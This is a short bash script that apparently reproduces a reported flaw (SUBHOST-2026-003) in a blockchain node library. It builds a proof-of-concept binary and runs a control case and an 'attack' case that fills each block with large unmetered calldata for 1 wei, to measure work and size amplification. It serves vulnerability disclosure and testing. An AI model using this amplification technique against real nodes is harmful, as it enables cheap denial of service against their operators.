#!/usr/bin/env bash
# Library-level reproduction for SUBHOST-2026-003.
#
# Drives RpcState::submit_transaction directly, so no RPC token or HTTP server is
# involved. Every submission is one 1-wei transfer: gas_price = 1, gas_limit = 1.
#
# Case A (control): empty calldata, 1000 blocks. Isolates the persist replay.
# Case B (attack):  131072-byte calldata per block, 200 blocks. Adds the size
#                   amplification from unmetered calldata.
set -euo pipefail

here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cargo_bin="${CARGO:-cargo}"

"$cargo_bin" build --release --manifest-path "$here/Cargo.toml"
bin="$here/target/release/poc-work-amplification"

echo "== Case A: 1000 blocks, empty calldata, 1 wei per block =="
"$bin" 1000 0

echo
echo "== Case B: 200 blocks, 131072 calldata bytes, 1 wei per block =="
"$bin" 200 131072